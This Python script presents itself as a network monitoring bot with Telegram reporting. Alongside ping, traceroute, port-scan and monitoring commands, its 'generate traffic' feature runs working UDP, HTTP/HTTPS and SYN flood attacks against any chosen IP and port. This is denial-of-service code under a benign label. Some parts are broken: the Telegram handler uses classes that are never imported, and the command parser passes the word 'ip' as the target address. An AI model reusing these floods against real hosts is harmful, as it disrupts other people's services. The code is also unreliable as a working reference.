import os
import sys
import time
import socket
import threading
import random
import subprocess
from datetime import datetime
import requests
import psutil
import scapy.all as scapy
from prettytable import PrettyTable
import json
import logging
from telegram import Bot, Update


# Configuration
CONFIG_FILE = "bot_config.json"
LOG_FILE = "accuratecyber_bot.log"
MONITOR_INTERVAL = 5  # seconds
TELEGRAM_UPDATE_INTERVAL = 60  # seconds

# Global variables
monitored_ips = {}
active_floods = {}
telegram_bot = None
telegram_chat_id = None
is_monitoring = False
monitoring_thread = None
telegram_thread = None

# Initialize logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class CyberSecurityBot:
    def __init__(self):
        self.load_config()
        self.initialize_telegram()
        self.commands = {
            "help": self.show_help,
            "exit": self.exit_bot,
            "ping": self.ping_ip,
            "start": self.start_monitoring,
            "stop": self.stop_monitoring,
            "export": self.export_to_telegram,
            "view": self.view_monitored,
            "status": self.show_status,
            "traceroute": self.traceroute_ip,
            "generate": self.generate_traffic,
            "add": self.add_ip,
            "del": self.delete_ip,
            "scan": self.scan_ip,
            "netstat": self.netstat_ip,
            "clear": self.clear_screen,
            "config": self.show_config,
            "save": self.save_config
        }

    def load_config(self):
        """Load configuration from file"""
        global telegram_chat_id
        
        try:
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    telegram_chat_id = config.get('telegram_chat_id')
                    if 'monitored_ips' in config:
                        monitored_ips.update(config['monitored_ips'])
                    logging.info("Configuration loaded successfully")
            else:
                logging.info("No configuration file found, using defaults")
        except Exception as e:
            logging.error(f"Error loading config: {str(e)}")

    def save_config(self, args=None):
        """Save current configuration to file"""
        config = {
            'telegram_chat_id': telegram_chat_id,
            'monitored_ips': monitored_ips
        }
        
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            logging.info("Configuration saved successfully")
            return "Configuration saved successfully"
        except Exception as e:
            logging.error(f"Error saving config: {str(e)}")
            return f"Error saving config: {str(e)}"

    def initialize_telegram(self):
        """Initialize Telegram bot if token is available"""
        global telegram_bot
        
        if os.getenv('TELEGRAM_BOT_TOKEN'):
            try:
                telegram_bot = Bot(token=os.getenv('TELEGRAM_BOT_TOKEN'))
                logging.info("Telegram bot initialized successfully")
            except Exception as e:
                logging.error(f"Error initializing Telegram bot: {str(e)}")

    def show_help(self, args=None):
        """Display help information"""
        help_text = """
Cyber Security Monitoring Bot - Command Reference:

General Commands:
  help                     - Show this help message
  exit                     - Exit the program
  clear                    - Clear the screen
  config                   - Show current configuration
  save                     - Save current configuration

Monitoring Commands:
  start monitoring         - Start monitoring all IPs
  stop                     - Stop monitoring
  view                     - View monitored IPs and their status
  status                   - Show monitoring status
  add ip <IP>              - Add an IP to monitor
  del ip <IP>              - Remove an IP from monitoring

Network Diagnostic Commands:
  ping ip <IP>             - Ping an IP address
  traceroute ip <IP>       - Perform traceroute to an IP
  scan ip <IP>             - Scan ports on an IP
  netstat ip <IP>          - Show network stats for an IP

Traffic Generation Commands:
  generate traffic <TYPE> <IP> <PORT> <DURATION>
                          - Generate network traffic
                          - Types: udp, http, https, syn

Telegram Integration:
  export to telegram       - Export current status to Telegram
"""
        return help_text

    def ping_ip(self, args):
        """Ping an IP address"""
        if len(args) < 1:
            return "Usage: ping ip <IP_ADDRESS>"
        
        ip = args[0]
        try:
            param = '-n' if os.name.lower() == 'nt' else '-c'
            command = ['ping', param, '4', ip]
            output = subprocess.check_output(command).decode('utf-8')
            return output
        except subprocess.CalledProcessError as e:
            return f"Ping failed: {e.output.decode('utf-8')}"
        except Exception as e:
            return f"Error pinging IP: {str(e)}"

    def start_monitoring(self, args=None):
        """Start monitoring all IPs"""
        global is_monitoring, monitoring_thread
        
        if is_monitoring:
            return "Monitoring is already running"
        
        if not monitored_ips:
            return "No IPs to monitor. Add IPs first with 'add ip <IP>'"
        
        is_monitoring = True
        monitoring_thread = threading.Thread(target=self.monitor_ips)
        monitoring_thread.daemon = True
        monitoring_thread.start()
        
        # Start Telegram updates if configured
        if telegram_bot and telegram_chat_id:
            global telegram_thread
            telegram_thread = threading.Thread(target=self.send_telegram_updates)
            telegram_thread.daemon = True
            telegram_thread.start()
        
        return "Started monitoring all IP addresses"

    def stop_monitoring(self, args=None):
        """Stop monitoring"""
        global is_monitoring
        
        if not is_monitoring:
            return "Monitoring is not currently running"
        
        is_monitoring = False
        if monitoring_thread and monitoring_thread.is_alive():
            monitoring_thread.join(timeout=1)
        
        return "Stopped monitoring all IP addresses"

    def export_to_telegram(self, args=None):
        """Export current status to Telegram"""
        if not telegram_bot or not telegram_chat_id:
            return "Telegram not configured. Set TELEGRAM_BOT_TOKEN environment variable."
        
        try:
            status = self.get_monitoring_status()
            telegram_bot.send_message(chat_id=telegram_chat_id, text=status)
            return "Status exported to Telegram successfully"
        except Exception as e:
            return f"Error exporting to Telegram: {str(e)}"

    def view_monitored(self, args=None):
        """View monitored IPs and their status"""
        if not monitored_ips:
            return "No IPs are currently being monitored"
        
        table = PrettyTable()
        table.field_names = ["IP Address", "Status", "Last Checked", "Latency (ms)", "Packet Loss (%)"]
        
        for ip, data in monitored_ips.items():
            table.add_row([
                ip,
                data.get('status', 'Unknown'),
                data.get('last_checked', 'Never'),
                data.get('latency', '-'),
                data.get('packet_loss', '-')
            ])
        
        return str(table)

    def show_status(self, args=None):
        """Show monitoring status"""
        status = f"Monitoring Status: {'Running' if is_monitoring else 'Stopped'}\n"
        status += f"Monitored IPs: {len(monitored_ips)}\n"
        status += f"Active Traffic Generators: {len(active_floods)}\n"
        status += f"Telegram Integration: {'Enabled' if telegram_bot and telegram_chat_id else 'Disabled'}"
        return status

    def traceroute_ip(self, args):
        """Perform traceroute to an IP"""
        if len(args) < 1:
            return "Usage: traceroute ip <IP_ADDRESS>"
        
        ip = args[0]
        try:
            if os.name.lower() == 'nt':
                command = ['tracert', ip]
            else:
                command = ['traceroute', ip]
            
            output = subprocess.check_output(command).decode('utf-8')
            return output
        except subprocess.CalledProcessError as e:
            return f"Traceroute failed: {e.output.decode('utf-8')}"
        except Exception as e:
            return f"Error performing traceroute: {str(e)}"

    def generate_traffic(self, args):
        """Generate network traffic"""
        if len(args) < 4:
            return "Usage: generate traffic <TYPE> <IP> <PORT> <DURATION>"
        
        flood_type = args[0].lower()
        ip = args[1]
        port = int(args[2])
        duration = int(args[3])
        
        if flood_type not in ['udp', 'http', 'https', 'syn']:
            return "Invalid traffic type. Choose from: udp, http, https, syn"
        
        if ip in active_floods:
            return f"Already generating {active_floods[ip]['type']} traffic to {ip}"
        
        thread = threading.Thread(
            target=self._run_flood_attack,
            args=(flood_type, ip, port, duration)
        )
        thread.daemon = True
        thread.start()
        
        active_floods[ip] = {
            'type': flood_type,
            'port': port,
            'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'thread': thread
        }
        
        return f"Started {flood_type} flood to {ip}:{port} for {duration} seconds"

    def _run_flood_attack(self, flood_type, ip, port, duration):
        """Internal method to run flood attacks"""
        end_time = time.time() + duration
        
        try:
            if flood_type == 'udp':
                self._udp_flood(ip, port, end_time)
            elif flood_type == 'http':
                self._http_flood(ip, port, end_time, False)
            elif flood_type == 'https':
                self._http_flood(ip, port, end_time, True)
            elif flood_type == 'syn':
                self._syn_flood(ip, port, end_time)
        except Exception as e:
            logging.error(f"Error in flood attack: {str(e)}")
        finally:
            active_floods.pop(ip, None)

    def _udp_flood(self, ip, port, end_time):
        """UDP flood implementation"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1024)
        
        while time.time() < end_time:
            try:
                sock.sendto(bytes, (ip, port))
            except:
                pass
            time.sleep(0.01)
        
        sock.close()

    def _http_flood(self, ip, port, end_time, use_https):
        """HTTP/HTTPS flood implementation"""
        protocol = 'https' if use_https else 'http'
        url = f"{protocol}://{ip}:{port}"
        
        while time.time() < end_time:
            try:
                requests.get(url, timeout=1, verify=False)
            except:
                pass
            time.sleep(0.1)

    def _syn_flood(self, ip, port, end_time):
        """SYN flood implementation"""
        while time.time() < end_time:
            try:
                ip_header = scapy.IP(dst=ip)
                tcp_header = scapy.TCP(dport=port, flags="S")
                packet = ip_header / tcp_header
                scapy.send(packet, verbose=0)
            except:
                pass
            time.sleep(0.01)

    def add_ip(self, args):
        """Add an IP to monitor"""
        if len(args) < 1:
            return "Usage: add ip <IP_ADDRESS>"
        
        ip = args[0]
        if ip in monitored_ips:
            return f"IP {ip} is already being monitored"
        
        # Validate IP address
        try:
            socket.inet_aton(ip)
        except socket.error:
            return f"Invalid IP address: {ip}"
        
        monitored_ips[ip] = {
            'status': 'Pending',
            'last_checked': 'Never',
            'latency': None,
            'packet_loss': None
        }
        
        return f"Added IP {ip} to monitoring list"

    def delete_ip(self, args):
        """Remove an IP from monitoring"""
        if len(args) < 1:
            return "Usage: del ip <IP_ADDRESS>"
        
        ip = args[0]
        if ip not in monitored_ips:
            return f"IP {ip} is not being monitored"
        
        monitored_ips.pop(ip)
        return f"Removed IP {ip} from monitoring list"

    def scan_ip(self, args):
        """Scan ports on an IP"""
        if len(args) < 1:
            return "Usage: scan ip <IP_ADDRESS>"
        
        ip = args[0]
        try:
            # Simple port scan - in a real tool, you'd want more sophisticated scanning
            open_ports = []
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389]
            
            for port in common_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
            
            if open_ports:
                return f"Open ports on {ip}: {', '.join(map(str, open_ports))}"
            else:
                return f"No common ports open on {ip}"
        except Exception as e:
            return f"Error scanning IP: {str(e)}"

    def netstat_ip(self, args):
        """Show network stats for an IP"""
        if len(args) < 1:
            return "Usage: netstat ip <IP_ADDRESS>"
        
        ip = args[0]
        try:
            connections = psutil.net_connections()
            filtered = [conn for conn in connections if conn.raddr and conn.raddr.ip == ip]
            
            if not filtered:
                return f"No active connections to {ip}"
            
            table = PrettyTable()
            table.field_names = ["Protocol", "Local Address", "Remote Address", "Status", "PID"]
            
            for conn in filtered:
                table.add_row([
                    conn.type,
                    f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "-",
                    f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "-",
                    conn.status,
                    conn.pid or "-"
                ])
            
            return str(table)
        except Exception as e:
            return f"Error getting network stats: {str(e)}"

    def clear_screen(self, args=None):
        """Clear the screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
        return ""

    def show_config(self, args=None):
        """Show current configuration"""
        config = {
            'Monitored IPs': list(monitored_ips.keys()),
            'Telegram Chat ID': telegram_chat_id,
            'Active Floods': len(active_floods),
            'Monitoring Active': is_monitoring
        }
        
        table = PrettyTable()
        table.field_names = ["Setting", "Value"]
        
        for key, value in config.items():
            table.add_row([key, value])
        
        return str(table)

    def monitor_ips(self):
        """Background thread to monitor IPs"""
        while is_monitoring:
            for ip in list(monitored_ips.keys()):
                try:
                    # Ping the IP to check status
                    param = '-n' if os.name.lower() == 'nt' else '-c'
                    command = ['ping', param, '2', ip]
                    
                    output = subprocess.run(
                        command,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    
                    if output.returncode == 0:
                        monitored_ips[ip]['status'] = 'Online'
                        
                        # Extract latency and packet loss from ping output
                        lines = output.stdout.split('\n')
                        if os.name.lower() == 'nt':
                            # Windows ping output parsing
                            time_line = [l for l in lines if 'time=' in l]
                            if time_line:
                                time_ms = time_line[0].split('time=')[1].split('ms')[0].strip()
                                monitored_ips[ip]['latency'] = time_ms
                            monitored_ips[ip]['packet_loss'] = 0
                        else:
                            # Linux/Mac ping output parsing
                            stats_line = [l for l in lines if 'packet loss' in l]
                            if stats_line:
                                loss = stats_line[0].split('packet loss')[0].split('%')[0].split()[-1]
                                monitored_ips[ip]['packet_loss'] = loss
                            
                            time_line = [l for l in lines if 'min/avg/max' in l]
                            if time_line:
                                times = time_line[0].split('=')[1].split('/')
                                monitored_ips[ip]['latency'] = times[1]  # avg latency
                    else:
                        monitored_ips[ip]['status'] = 'Offline'
                        monitored_ips[ip]['latency'] = '-'
                        monitored_ips[ip]['packet_loss'] = '100'
                    
                    monitored_ips[ip]['last_checked'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                except Exception as e:
                    logging.error(f"Error monitoring IP {ip}: {str(e)}")
                    monitored_ips[ip]['status'] = 'Error'
            
            time.sleep(MONITOR_INTERVAL)

    def send_telegram_updates(self):
        """Background thread to send periodic updates to Telegram"""
        while is_monitoring and telegram_bot and telegram_chat_id:
            try:
                status = self.get_monitoring_status()
                telegram_bot.send_message(chat_id=telegram_chat_id, text=status)
            except Exception as e:
                logging.error(f"Error sending Telegram update: {str(e)}")
            
            time.sleep(TELEGRAM_UPDATE_INTERVAL)

    def get_monitoring_status(self):
        """Generate a status report for monitoring"""
        online = sum(1 for ip in monitored_ips.values() if ip.get('status') == 'Online')
        offline = len(monitored_ips) - online
        
        status = f"📡 *Cyber Security Monitoring Status*\n\n"
        status += f"🟢 Online: {online}\n"
        status += f"🔴 Offline: {offline}\n"
        status += f"⏱ Last Update: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        
        if active_floods:
            status += "⚠️ *Active Traffic Generation*\n"
            for ip, data in active_floods.items():
                status += f"• {data['type'].upper()} flood to {ip}:{data['port']} (started {data['start_time']})\n"
        
        return status

    def exit_bot(self, args=None):
        """Clean up and exit the program"""
        self.stop_monitoring()
        self.save_config()
        logging.info("Cyber Security Bot shutting down")
        print("Goodbye!")
        sys.exit(0)

    def process_command(self, command_input):
        """Process user input commands"""
        parts = command_input.split()
        if not parts:
            return ""
        
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        
        if cmd in self.commands:
            return self.commands[cmd](args)
        else:
            return f"Unknown command: {cmd}. Type 'help' for available commands."

def telegram_updater():
    """Set up Telegram bot handlers"""
    token = os.getenv('TELEGRAM_BOT_TOKEN')
    if not token:
        return
    
    updater = Updater(token=token, use_context=True)
    dispatcher = updater.dispatcher
    
    def start(update: Update, context: CallbackContext):
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Cyber Security Monitoring Bot is ready. Use /help for commands."
        )
    
    def help_command(update: Update, context: CallbackContext):
        help_text = bot.show_help()
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=help_text
        )
    
    def status_command(update: Update, context: CallbackContext):
        status = bot.show_status()
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=status
        )
    
    def view_command(update: Update, context: CallbackContext):
        view = bot.view_monitored()
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"```\n{view}\n```",
            parse_mode='Markdown'
        )
    
    # Register handlers
    dispatcher.add_handler(CommandHandler('start', start))
    dispatcher.add_handler(CommandHandler('help', help_command))
    dispatcher.add_handler(CommandHandler('status', status_command))
    dispatcher.add_handler(CommandHandler('view', view_command))
    
    # Start the bot
    updater.start_polling()
    updater.idle()

def main():
    """Main program loop"""
    global bot
    
    print("""
  ____      _          ____                  _   _      _     
 / ___|   _| |__   ___/ ___|  ___ _ __   ___| |_(_) ___| |__  
| |  | | | | '_ \ / _ \___ \ / _ \ '_ \ / __| __| |/ __| '_ \ 
| |__| |_| | |_) |  __/___) |  __/ | | | (__| |_| | (__| | | |
 \____\__,_|_.__/ \___|____/ \___|_| |_|\___|\__|_|\___|_| |_|
                                                              
Cyber Security Monitoring Bot
Type 'help' for available commands
""")
    
    bot = CyberSecurityBot()
    
    # Start Telegram updater in a separate thread if token is available
    if os.getenv('TELEGRAM_BOT_TOKEN'):
        t = threading.Thread(target=telegram_updater)
        t.daemon = True
        t.start()
    
    while True:
        try:
            command = input("cyberbot> ").strip()
            if not command:
                continue
                
            result = bot.process_command(command)
            if result:
                print(result)
        except KeyboardInterrupt:
            print("\nUse 'exit' command to quit")
        except Exception as e:
            print(f"Error: {str(e)}")

if __name__ == "__main__":
    bot = None
    main()